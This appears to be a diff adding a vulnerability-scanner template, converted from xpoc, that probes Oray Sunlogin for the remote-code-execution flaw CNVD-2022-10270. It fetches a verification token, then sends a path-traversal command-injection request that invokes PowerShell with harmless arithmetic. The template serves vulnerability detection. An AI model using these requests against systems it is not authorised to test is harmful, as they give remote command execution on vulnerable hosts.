@@ -1,0 +1,35 @@
+id: yaml-poc-oray-sunlogin-other-CNVD-2022-10270
+info:
+  name: Yaml Poc Oray Sunlogin Other Cnvd 2022 10270
+  author: converted
+  severity: high
+  description: 'Converted from xpoc: yaml-poc-oray-sunlogin-other-CNVD-2022-10270'
+  tags: xpoc
+  reference:
+  - https://www.cnvd.org.cn/flaw/show/CNVD-2022-10270
+  - https://www.cnvd.org.cn/flaw/show/CNVD-2022-03672
+http:
+- method: GET
+  path:
+  - /cgi-bin/rpc?action=verify-haras
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
+  - type: word
+    part: body
+    words:
+    - verify_string
+    - __code
+    - enabled
+- method: GET
+  path:
+  - /check?cmd=ping..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fsystem32%2Fwindowspowershell%2fv1.0%2fpowershell+{{randInt0}}*{{randInt1}}
+  headers:
+    Cookie: CID={{token}}
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
